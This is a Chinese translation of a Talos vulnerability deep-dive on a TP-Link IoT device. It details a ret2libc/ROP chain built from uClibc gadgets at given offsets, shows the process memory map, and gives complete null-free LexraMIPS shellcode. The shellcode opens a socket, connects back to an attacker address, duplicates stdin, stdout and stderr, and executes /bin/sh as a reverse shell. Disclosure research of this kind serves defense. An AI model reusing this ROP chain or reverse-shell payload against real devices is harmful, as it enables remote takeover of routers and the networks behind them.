在我们使用这种技术之前，我们需要找到一种方法来获取`memcpy()`代码的执行情况。
很幸运，在这个设备上有一个可执行的堆栈，然而，我们不知道我们的代码存储在哪里。
我们最终使用了一种改进的`ret2libc`技术，此技术帮助我们利用`uClibc`中的小工具来获取堆栈的指针并为我们的代码设置寄存器。
我们的第一个小工具位于`uClibc`的偏移`0x0002fc84`处，用于将堆栈指针递增`0x20`以超过任何`memcpy shellcode`。
为了确保使用此工具后能够获得对程序执行的控制权限，我们将第二个小工具的地址放在`0x20 + $ sp`的位置，如下所示。
    LOAD:0002FC84                 lw      $ra, 0x20+var_8($sp)
    LOAD:0002FC88                 jr      $ra
    LOAD:0002FC8C                 addiu   $sp, 0x20
位于`uClibc`偏移地址`0x000155b0`的第二个工具用于获取指向递增堆栈的指针。 系统将所需的指针放入寄存器`$ a1`中。
之后，我们将第三个工具的地址放在`0x58 + $ sp`位置，如下所示，以确保使用后能够拿到对程序的控制权限。
    LOAD:000155B0                 addiu   $a1, $sp, 0x58+var_40
    LOAD:000155B4                 lw      $gp, 0x58+var_48($sp)
    LOAD:000155B8                 sltiu   $v0, 1
    LOAD:000155BC                 lw      $ra, 0x58+var_8($sp)
    LOAD:000155C0                 jr      $ra
    LOAD:000155C4                 addiu   $sp, 0x58
最后，位于`uClibc`偏移地址`0x000172fc`的工具用于跳转到堆栈缓冲区。
    LOAD:000172FC                 move    $t9, $a1
    LOAD:00017300                 move    $a1, $a2
    LOAD:00017304                 sw      $v0, 0x4C($a0)
    LOAD:00017308                 jr      $t9
    LOAD:0001730C                 addiu   $a0, 0x4C  # 'L'
为了方便查询工具执行成功的具体位置，我们需要获取`uClibc`的加载地址。之后我们查看下面的进程内存映射，可以看到`uClibc`的可执行版本会加载到地址`0x2aaee000`处。
    # cat /proc/12518/maps
    cat /proc/12518/maps
    00400000-00538000 r-xp 00000000 1f:02 69         /usr/bin/httpd
    00578000-00594000 rw-p 00138000 1f:02 69         /usr/bin/httpd
    00594000-006a6000 rwxp 00000000 00:00 0          [heap]
    2aaa8000-2aaad000 r-xp 00000000 1f:02 359        /lib/ld-uClibc-0.9.30.so
    2aaad000-2aaae000 rw-p 00000000 00:00 0 
    2aaae000-2aab2000 rw-s 00000000 00:06 0          /SYSV0000002f (deleted)
    2aaec000-2aaed000 r--p 00004000 1f:02 359        /lib/ld-uClibc-0.9.30.so
    2aaed000-2aaee000 rw-p 00005000 1f:02 359        /lib/ld-uClibc-0.9.30.so
    2aaee000-2ab21000 r-xp 00000000 1f:02 363        /lib/libuClibc-0.9.30.so
    2ab21000-2ab61000 ---p 00000000 00:00 0 
    2ab61000-2ab62000 rw-p 00033000 1f:02 363        /lib/libuClibc-0.9.30.so
    2ab62000-2ab66000 rw-p 00000000 00:00 0 
    2ab66000-2ab68000 r-xp 00000000 1f:02 349        /lib/librt-0.9.30.so
    2ab68000-2aba7000 ---p 00000000 00:00 0 
    ...
    7f001000-7f200000 rwxp 00000000 00:00 0 
    7f200000-7f201000 ---p 00000000 00:00 0 
    7f201000-7f400000 rwxp 00000000 00:00 0 
    7f400000-7f401000 ---p 00000000 00:00 0 
    7f401000-7f600000 rwxp 00000000 00:00 0 
    7fcf7000-7fd0c000 rwxp 00000000 00:00 0          [stack]
通过获取`uClibc`的加载地址并将其添加到工具所获取的偏移地址处，我们可以获得所需代码的可用地址。然后我们策略性地放置这些地址，从而执行我们的初始代码，随后执行我们自行设置的payload。
### LexraMIPS shellcode
虽然`LexraMIPS`基于了`MIPS规范`，但在尝试执行某些标准MIPS指令时，它确存在偏差。
因此，我们此处选择使用`GCC工具`专门为`LexraMIPS`开发`shellcode`。
下面的代码采用创建连接的方法，将stdin、stdout和stderr复制到套接字文件描述符中，最后生成一个shell。
我们首先在设备上打开一个套接字，利用一种技术来避免`$ t7`寄存器中产生任何空字节。 此外我们应该注意，`MIPS $
zero`寄存器在使用时不能包含任何空字节。
    li $t7, -6           # set up $t7 with the value 0xfffffffa
    nor $t7, $t7, $zero  # nor $t7 with zero to get the value 0x05 w/o nulls
    addi $a0, $t7, -3    # $a0 must hold family (AF_INET - 0x02) 
    addi $a1, $t7, -3    # $a1 must hold type (SOCK_STREAM - 0x02) 
    slti $a2, $zero, -1  # $a2 must hold protocol (essentially unset - 0x00)
    li $v0, 4183         # sets the desired syscall to 'socket'
    syscall 0x40404      # triggers a syscall, removing null bytes
打开套接字后，我们使用`connect syscall`连接设备与攻击者的TCP。
在此步骤中，产生空字节是一个特殊问题，因为此设备的默认子网包含零。
为了避免这个问题，我们利用一种技术强制我们的预寄存器值产生溢出并产生所需的IP地址从而不使用空字节。
    sw $v0, -36($sp)     # puts the returned socket reference onto the stack
    lw $a0, -36($sp)     # $a0 must hold the file descriptor - pulled from the stack
    sw $a1, -32($sp)     # place socket type (SOCK_STREAM - 0x02) onto the stack
    lui $t7, 8888        # prep the upper half of $t7 register with the port number 
    ori $t7, $t7, 8888   # or the $t7 register with the desired port number 
    sw $t7, -28($sp)     # place the port onto the stack
    lui $t7, 0xc0a7      # put the first half of the ip addr into $t7 (192.166)
    ori $t7, 0xff63      # put the second half of the ip addr into $t7 (255.99)
    addiu $t7, 0x101     # fix the ip addr (192.166.255.99 --> 192.168.0.100)
    sw $t7, -26($sp)     # put the ip address onto the stack
    addiu $a1, $sp, -30  # put a pointer to the sockaddr struct into $a1
    li $t7, -17          # load 0xffef into $t7 for later processing
    nor $a2, $t7, $zero  # $a2 must hold the address length - 0x10
    li $v0, 4170         # sets the desired syscall to 'connect'
    syscall 0x40404      # triggers a syscall, removing null bytes
为确保设备能接受我们的输入并正确显示输出，我们必须复制stdin、stdout和stderr文件描述符。
之后我们将每个I/O文件描述符复制到我们的套接字中，从而能够成功地为设备提供输入并查看输出。
    lw $t7, -32($sp)     # load $t7 for later file descriptor processing
    lw $a0, -36($sp)     # put the socket fd into $a0
    lw $a1, -32($sp)     # put the stderr fd into $a1
    li $v0, 4063         # sets the desired syscall to 'dup2'
    syscall 0x40404      # triggers a syscall, removing null bytes
    lw $t7, -32($sp)     # load $t7 for later file descriptor processing
    lw $a0, -36($sp)     # put the socket fd into $a0
    addi $a1, $t7, -1    # put the stdout fd into $a1
    li $v0, 4063         # sets the desired syscall to 'dup2'
    syscall 0x40404      # triggers a syscall, removing null bytes
    lw $t7, -32($sp)     # load $t7 for later file descriptor processing
    lw $a0, -36($sp)     # put the socket fd into $a0
    addi $a1, $t7, -2    # put the stdin syscall into $a1
    li $v0, 4063         # sets the desired syscall to 'dup2'
    syscall 0x40404      # triggers a syscall, removing null bytes
最后，我们使用`execve`系统调用在设备上本地生成shell。
由于这个shell是从我们的socket生成的，并且我们已经控制了`stdin/stdout/stderr`，于是我们可以通过远程连接来控制新的shell。
    lui $t7, 0x2f2f      # start building the command string    --> //
    ori $t7, $t7, 0x6269 # continue building the command string --> bi
    sw $t7, -20($sp)     # put the string so far onto the stack
    lui $t7, 0x6e2f      # continue building the command string --> n/
    ori $t7, $t7, 0x7368 # continue building the command string --> sh
    sw $t7, -16($sp)     # put the next portion of the string onto the stack
    sw $zero, -12($sp)   # null terminate the command string
    addiu $a0, $sp, -20  # place a pointer to the command string into arg 1
    sw $a0, -8($sp)      # place a pointer to the command string array onto the stack
    sw $zero, -4($sp)    # null terminate the array
    addiu $a1, $sp, -8   # load the pointer to our command string array into arg 2
    slti $a2, $zero, -1  # sets $a2 to 0
    li $v0, 4011         # sets the desired syscall to 'execve'
    syscall 0x40404      # triggers a syscall, removing null bytes
通过设备上的功能，我们可以继续对设备进行分析。
### 结论
这些漏洞在物联网设备中都很常见。
攻击者可以在发现这些问题后将其结构化以便在其他设备上执行这些攻击代码。我们都必须意识到物联网设备与计算机一样，需要维护相应的软件安全以保证设备的安全性。
Talos将继续研究此类漏洞，并与供应商合作以确保客户受到保护，并在必要时提供额外的深度分析。
    本文为翻译稿件，原文来源于：https://blog.talosintelligence.com/2019/01/vulnerability-deep-dive-tp-link.html